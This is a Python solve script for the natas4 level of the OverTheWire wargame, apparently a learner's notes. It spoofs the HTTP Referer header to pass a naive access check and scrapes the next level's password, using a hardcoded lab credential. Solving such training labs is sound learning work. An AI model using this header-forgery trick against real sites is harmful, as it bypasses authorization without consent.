#!/usr/bin/env python

#using requests module for python, not sure if I will need to install anything for this?
import requests
import re

username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'
url = 'http://%s.natas.labs.overthewire.org/' % username
#so we see this "you are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
#The ""is probably coming from the http headers, we can add that, apparently using a dictionary
ourheaders = { "Referer" : "howdydo" }

print(url) #make sure the URL works fine

#response = requests.get(url, auth = (username, password), headers = ourheaders)
#this shows that it worked, so we're goinng to redo it with the value it wants
notourheaders = { "Referer" : "http://natas5.natas.labs.overthewire.org/" }
response = requests.get(url, auth = (username, password), headers = notourheaders)

content = response.text
######################
print(content)


print(re.findall('Access granted. The password for natas5 is (.*)', content))